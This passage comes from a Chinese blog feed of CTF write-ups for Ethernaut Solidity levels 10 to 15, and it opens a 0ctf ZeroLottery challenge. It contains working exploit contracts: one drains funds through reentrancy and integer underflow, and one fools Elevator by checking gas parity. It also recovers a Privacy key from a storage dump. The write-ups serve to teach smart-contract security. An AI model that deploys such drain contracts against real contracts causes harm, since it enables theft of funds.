you to steal all the funds from the contract.</p><p>  Things that might help:</p><ul><li>Untrusted contracts can execute code where you least expect it.</li><li>Fallback methods</li><li>Throw/revert bubbling</li><li>Sometimes the best way to attack a contract is with another contract.</li><li>See the Help page above, section “Beyond the console”</li></ul></blockquote><p>源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Reentrance &#123;</span><br><span class="line"></span><br><span class="line">  mapping(<span class="function"><span class="params">address</span> =&gt;</span> uint) public balances;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">donate</span>(<span class="params">address _to</span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line">    balances[_to] += msg.value;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">balanceOf</span>(<span class="params">address _who</span>) <span class="title">public</span> <span class="title">view</span> <span class="title">returns</span> (<span class="params">uint balance</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> balances[_who];</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint _amount</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span>(balances[msg.sender] &gt;= _amount) &#123;</span><br><span class="line">      <span class="keyword">if</span>(msg.sender.call.value(_amount)()) &#123;</span><br><span class="line">        _amount;</span><br><span class="line">      &#125;</span><br><span class="line">      balances[msg.sender] -= _amount;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用自己部署的合约调用目标合约的withdraw，然后，它通过call向我们转账，这时，调用了我们的fallback函数并且带上了所有剩余的gas，我们在fallback中调用该合约的withdraw函数，就能够再次转钱啦，这时我们的fallback函数就放行就ok，这里可以顺带来个整数下溢，美滋滋。</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Level10Exp &#123;</span><br><span class="line">    address public owner;</span><br><span class="line">    address public vulnerable_contract;</span><br><span class="line">    bool public attacked;</span><br><span class="line">    uint amount;</span><br><span class="line"></span><br><span class="line">    modifier OwnerOnly()&#123;</span><br><span class="line"><span class="built_in">require</span>(msg.sender == owner);</span><br><span class="line">_;</span><br><span class="line">&#125;</span><br><span class="line">    </span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">Level10Exp</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        owner = msg.sender;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="comment">/// 这里记得转一点点钱，1wei就够了</span></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">init</span>(<span class="params">address addr</span>) <span class="title">public</span> <span class="title">payable</span></span>&#123;</span><br><span class="line">    vulnerable_contract = addr;</span><br><span class="line">    attacked = <span class="literal">false</span>;</span><br><span class="line">    amount = msg.value;</span><br><span class="line">    vulnerable_contract.call.value(msg.value)(bytes4(keccak256(<span class="string">"donate(address)"</span>)),<span class="keyword">this</span>);</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params"></span>) <span class="title">public</span> </span>&#123;</span><br><span class="line"><span class="built_in">require</span>(!attacked);</span><br><span class="line">    vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdraw(uint256)"</span>)),amount);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">withdraw</span>(<span class="params">uint balance</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">     vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdraw(uint256)"</span>)),balance);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">function</span> <span class="title">paolu</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">OwnerOnly</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">    selfdestruct(owner);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>(<span class="params"></span>) <span class="title">public</span> <span class="title">payable</span> </span>&#123;</span><br><span class="line"><span class="keyword">if</span>(!attacked)&#123;</span><br><span class="line">    vulnerable_contract.call(bytes4(keccak256(<span class="string">"withdraw(uint256)"</span>)),amount);  <span class="comment">// 这里可以导致整数下溢了，后面可以随意取钱了</span></span><br><span class="line">attacked = <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><blockquote><p>Use <code>transfer</code> to move funds out of your contract, since it <code>throw</code>s and limits gas forwarded. Low level functions like <code>call</code> and <code>send</code> just return false but don’t interrupt the execution flow when the receiving contract fails.</p><p>Always assume that the receiver of the funds you are sending can be another contract, not just a regular address. Hence, it can execute code in its payable fallback method and <em>re-enter</em> your contract, possibly messing up your state/logic.</p><p>Re-entrancy is a common attack. You should always be prepared for it!</p><p> The DAO Hack</p><p>The famous DAO hack used reentrancy to extract a huge amount of ether from the victim contract. See <a href="https://blog.zeppelin.solutions/15-lines-of-code-that-could-have-prevented-thedao-hack-782499e00942" target="_blank" rel="noopener">15 lines of code that could have prevented TheDAO Hack</a>.</p></blockquote><h3 id="level-11-Elevator"><a href="#level-11-Elevator" class="headerlink" title="level 11 Elevator"></a>level 11 Elevator</h3><blockquote><p>This elevator won’t let you reach the top of your building. Right?</p><p> Things that might help:</p><ul><li>Sometimes solidity is not good at keeping promises.</li><li>This <code>Elevator</code> expects to be used from a <code>Building</code>.</li></ul></blockquote><p>源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">view</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Elevator</span> </span>&#123;</span><br><span class="line">  bool public top;</span><br><span class="line">  uint public floor;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">goTo</span>(<span class="params">uint _floor</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    Building building = Building(msg.sender);</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (! building.isLastFloor(_floor)) &#123;</span><br><span class="line">      floor = _floor;</span><br><span class="line">      top = building.isLastFloor(floor);</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>这里，我们要部署一个合约，这个合约继承Building接口，然后，第一次调用返回false，第二次调用返回true，就OK啦。注意到这里函数isLastFloor是被view修饰的，这代表着我们不能进行修改变量，那么我们要怎么判断是第一次调用还是第二次呢？</p><p>有看到网上说solidity没有强制view修饰，但是我用remix时发现试试报错的。所以，想别的办法，</p><p>可以看到先后两次调用了building.isLastFloor，而且参数是一样的，可以想想两次调用有什么不同，容易想到剩余的gas不同，所以，exp如下</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">interface Building &#123;</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint</span>) <span class="title">view</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>);</span></span><br><span class="line"><span class="function">&#125;</span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"></span></span><br><span class="line"><span class="function"><span class="title">contract</span> <span class="title">Level11Exp</span> <span class="title">is</span> <span class="title">Building</span></span>&#123;</span><br><span class="line">bool public lastFloor;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">isLastFloor</span>(<span class="params">uint i</span>) <span class="title">view</span> <span class="title">public</span> <span class="title">returns</span> (<span class="params">bool</span>)</span>&#123;</span><br><span class="line"><span class="keyword">return</span> gasleft()%<span class="number">2</span>==<span class="number">0</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">attack</span>(<span class="params">address vulnerable_contract</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">vulnerable_contract.call(bytes4(keccak256(<span class="string">"goTo(uint256)"</span>)),<span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>尝试几次就能OK。</p><blockquote><p>Currently, the Solidity compiler does nothing to enforce that a <code>view</code> or <code>constant</code> function is not modifying state. The same applies to <code>pure</code> functions, which should not read state but they can. Make sure you read <a href="http://solidity.readthedocs.io/en/develop/contracts.html#view-functions" target="_blank" rel="noopener">Solidity’s documentation</a> and learn its caveats. </p></blockquote><p>可以看到官方预期解都是用的不强制view修饰符，所以，我的是非预期Orz。</p><h3 id="level-12-Privacy"><a href="#level-12-Privacy" class="headerlink" title="level 12 Privacy"></a>level 12 Privacy</h3><blockquote><p>The creator of this contract was careful enough to protect the sensitive areas of its storage.</p><p>Unlock this contract to beat the level.</p><p>Things that might help:</p><ul><li>Understanding how storage works</li><li>Understanding how parameter parsing works</li><li>Understanding how casting works</li></ul><p>Tips:</p><ul><li>Remember that metamask is just a commodity. Use another tool if it is presenting problems. Advanced gameplay could involve using remix, or your own web3 provider.</li></ul></blockquote><p>源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract Privacy &#123;</span><br><span class="line"></span><br><span class="line">  bool public locked = <span class="literal">true</span>;</span><br><span class="line">  uint256 public constant ID = block.timestamp;</span><br><span class="line">  uint8 private flattening = <span class="number">10</span>;</span><br><span class="line">  uint8 private denomination = <span class="number">255</span>;</span><br><span class="line">  uint16 private awkwardness = uint16(now);</span><br><span class="line">  bytes32[<span class="number">3</span>] private data;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">Privacy</span>(<span class="params">bytes32[<span class="number">3</span>] _data</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    data = _data;</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">unlock</span>(<span class="params">bytes16 _key</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    <span class="built_in">require</span>(_key == bytes16(data[<span class="number">2</span>]));</span><br><span class="line">    locked = <span class="literal">false</span>;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">/*</span></span><br><span class="line"><span class="comment">    A bunch of super advanced solidity algorithms...</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">      ,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`</span></span><br><span class="line"><span class="comment">      .,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,</span></span><br><span class="line"><span class="comment">      *.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^         ,---/V\</span></span><br><span class="line"><span class="comment">      `*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.    ~|__(o.o)</span></span><br><span class="line"><span class="comment">      ^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'^`*.,*'  UU  UU</span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>容易拿到数据</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">0x000000000000000000000000000000000000000000000000000000af74ff0a01</span><br><span class="line">0x02c816cfee7e90b75ea59405dafb348c6e90765b95ffc1abee6d38f5bd940043</span><br><span class="line">0xa6d0b6d669da4f4889c1767b1f17798032fbdc3efdd7393e366afee930b13387</span><br><span class="line">0x9c9841d9296eb0165baf6a18395b289a21e6d261e883d3d6a5132abe378374d6</span><br><span class="line">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">0x0000000000000000000000000000000000000000000000000000000000000000</span><br><span class="line">后面都是0了</span><br></pre></td></tr></table></figure><p>有一些数据对齐之类的东西啦</p><p>看数据类型，可以知道</p><p>a6d0b6d669da4f4889c1767b1f17798032fbdc3efdd7393e366afee930b13387</p><p>这个应该就是data[2]</p><p>转成bytes16则取前16位，得到结果</p><p>a6d0b6d669da4f4889c1767b1f177980</p><p>分析下数据和提交数据就OK了，有空回头再看。</p><h3 id="level-13-Gatekeeper-One"><a href="#level-13-Gatekeeper-One" class="headerlink" title="level 13 Gatekeeper One"></a>level 13 Gatekeeper One</h3><blockquote><p>Make it past the gatekeeper and register as an entrant to pass this level.</p><p> Things that might help:</p><ul><li>Remember what you’ve learned from the Telephone and Token levels.</li><li>You can learn more about the <code>msg.gas</code> special variable, or its preferred alias <code>gasleft()</code>, in Solidity’s documentation (see <a href="http://solidity.readthedocs.io/en/v0.4.23/units-and-global-variables.html" target="_blank" rel="noopener">here</a> and <a href="http://solidity.readthedocs.io/en/v0.4.23/control-structures.html#external-function-calls" target="_blank" rel="noopener">here</a>).</li></ul></blockquote><p>源代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperOne &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.gas % <span class="number">8191</span> == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) != uint64(_gateKey));</span><br><span class="line">    <span class="built_in">require</span>(uint32(_gateKey) == uint16(tx.origin));</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大家自己尝试下吧^^</p><h3 id="level-14-Gatekeeper-Two"><a href="#level-14-Gatekeeper-Two" class="headerlink" title="level 14 Gatekeeper Two"></a>level 14 Gatekeeper Two</h3><blockquote><p>This gatekeeper introduces a few new challenges. Register as an entrant to pass this level.</p><p> Things that might help:</p><ul><li>Remember what you’ve learned from getting past the first gatekeeper - the first gate is the same.</li><li>The <code>assembly</code> keyword in the second gate allows a contract to access functionality that is not native to vanilla Solidity. See <a href="http://solidity.readthedocs.io/en/v0.4.23/assembly.html" target="_blank" rel="noopener">here</a> for more information. The <code>extcodesize</code> call in this gate will get the size of a contract’s code at a given address - you can learn more about how and when this is set in section 7 of the <a href="https://ethereum.github.io/yellowpaper/paper.pdf" target="_blank" rel="noopener">yellow paper</a>.</li><li>The <code>^</code> character in the third gate is a bitwise operation (XOR), and is used here to apply another common bitwise operation (see <a href="http://solidity.readthedocs.io/en/v0.4.23/miscellaneous.html#cheatsheet" target="_blank" rel="noopener">here</a>). The Coin Flip level is also a good place to start when approaching this challenge.</li></ul><p>Get new instance</p></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line">contract GatekeeperTwo &#123;</span><br><span class="line"></span><br><span class="line">  address public entrant;</span><br><span class="line"></span><br><span class="line">  modifier gateOne() &#123;</span><br><span class="line">    <span class="built_in">require</span>(msg.sender != tx.origin);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateTwo() &#123;</span><br><span class="line">    uint x;</span><br><span class="line">    assembly &#123; <span class="attr">x</span> := extcodesize(caller) &#125;</span><br><span class="line">    <span class="built_in">require</span>(x == <span class="number">0</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  modifier gateThree(bytes8 _gateKey) &#123;</span><br><span class="line">    <span class="built_in">require</span>(uint64(keccak256(msg.sender)) ^ uint64(_gateKey) == uint64(<span class="number">0</span>) - <span class="number">1</span>);</span><br><span class="line">    _;</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">enter</span>(<span class="params">bytes8 _gateKey</span>) <span class="title">public</span> <span class="title">gateOne</span> <span class="title">gateTwo</span> <span class="title">gateThree</span>(<span class="params">_gateKey</span>) <span class="title">returns</span> (<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    entrant = tx.origin;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大家自己尝试下吧^^</p><h3 id="level-15-Naught-Coin"><a href="#level-15-Naught-Coin" class="headerlink" title="level 15 Naught Coin"></a>level 15 Naught Coin</h3><blockquote><p>NaughtCoin is an ERC20 token and you’re already holding all of them. The catch is that you’ll only be able to transfer them after a 10 year lockout period. Can you figure out how to get them out to another address so that you can transfer them freely? Complete this level by getting your token balance to 0.</p><p>  Things that might help</p><ul><li>The <a href="https://github.com/ethereum/EIPs/blob/master/EIPS/eip-20.md" target="_blank" rel="noopener">ERC20</a> Spec</li><li>The <a href="https://github.com/OpenZeppelin/zeppelin-solidity/tree/master/contracts" target="_blank" rel="noopener">OpenZeppelin</a> codebase</li></ul></blockquote><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.18</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> <span class="string">'zeppelin-solidity/contracts/token/ERC20/StandardToken.sol'</span>;</span><br><span class="line"></span><br><span class="line"> contract NaughtCoin is StandardToken &#123;</span><br><span class="line"></span><br><span class="line">  string public constant name = <span class="string">'NaughtCoin'</span>;</span><br><span class="line">  string public constant symbol = <span class="string">'0x0'</span>;</span><br><span class="line">  uint public constant decimals = <span class="number">18</span>;</span><br><span class="line">  uint public timeLock = now + <span class="number">10</span> years;</span><br><span class="line">  uint public INITIAL_SUPPLY = <span class="number">1000000</span> * (<span class="number">10</span> ** decimals);</span><br><span class="line">  address public player;</span><br><span class="line"></span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">NaughtCoin</span>(<span class="params">address _player</span>) <span class="title">public</span> </span>&#123;</span><br><span class="line">    player = _player;</span><br><span class="line">    totalSupply_ = INITIAL_SUPPLY;</span><br><span class="line">    balances[player] = INITIAL_SUPPLY;</span><br><span class="line">    Transfer(<span class="number">0x0</span>, player, INITIAL_SUPPLY);</span><br><span class="line">  &#125;</span><br><span class="line">  </span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">transfer</span>(<span class="params">address _to, uint256 _value</span>) <span class="title">lockTokens</span> <span class="title">public</span> <span class="title">returns</span>(<span class="params">bool</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">super</span>.transfer(_to, _value);</span><br><span class="line">  &#125;</span><br><span class="line"></span><br><span class="line">  <span class="comment">// Prevent the initial owner from transferring tokens until the timelock has passed</span></span><br><span class="line">  modifier lockTokens() &#123;</span><br><span class="line">    <span class="keyword">if</span> (msg.sender == player) &#123;</span><br><span class="line">      <span class="built_in">require</span>(now &gt; timeLock);</span><br><span class="line">      <span class="keyword">if</span> (now &lt; timeLock) &#123;</span><br><span class="line">        _;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">     _;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>大家自己尝试下吧^^</p>]]></content>
      
      
      <categories>
          
          <category> 信息安全 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> writeup </tag>
            
            <tag> 智能合约 </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>0ctf-线下-misc-ZeroLottery</title>
      <link href="//blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html"/>
      <url>//blog/2018/0ctf-%E7%BA%BF%E4%B8%8B-misc-ZeroLottery.html</url>
      
        <content type="html"><![CDATA[<h3 id="题目详情"><a href="#题目详情" class="headerlink" title="题目详情"></a>题目详情</h3><blockquote><p>Hello guys, welcome to the wonderful ethereum casino. We proudly present our first lottery game, ZeroLottery. Give me your lucky number, chances to get huge amount of money back! Every one can read the code, fair and honest. There is only one small step between you and billionaire. Come to win now!</p><h2 id="Attention"><a href="#Attention" class="headerlink" title="Attention"></a>Attention</h2><p>Every team has a independent private chain. The password for account <code>0xAC9E27B1fABd55D3E85104d9FEB945C57d99f43A</code> is <code>tctf2018</code> with 10 ETH. The address of ZeroLottery is <code>0xb3883b88A48923187A22Ee27d4cb840a4Be68fD3</code>. We expose a json rpc port(<code>http://192.168.201.18:80</code>) of the private chain.</p><p>Your goal is make your ZeroLottery’s balance &gt; 500. After that, you can get the flag at <code>http://192.168.201.18:5000/flag?wallet=&lt;YOUR ADDRESS&gt;</code> page.</p><p>Read the source code first before have a try! Do not attack the platform!</p></blockquote><p>大概意思是有个智能合约，你有个有<code>10 ether</code> 的账户，想办法获取<code>&gt;500</code>的balance。</p><p>智能合约代码</p><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line">pragma solidity ^<span class="number">0.4</span><span class="number">.21</span>;</span><br><span class="line">contract ZeroLottery &#123;</span><br><span class="line">    struct SeedComponents 